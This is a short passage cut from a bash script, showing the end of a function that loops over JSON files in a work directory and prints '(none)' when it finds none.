  done < <(find "$TERMWORK_DIR" -maxdepth 1 -name '*.json' -print0 2>/dev/null)

  if [[ $found -eq 0 ]]; then
    echo "🖥️  (none)"
  fi
}
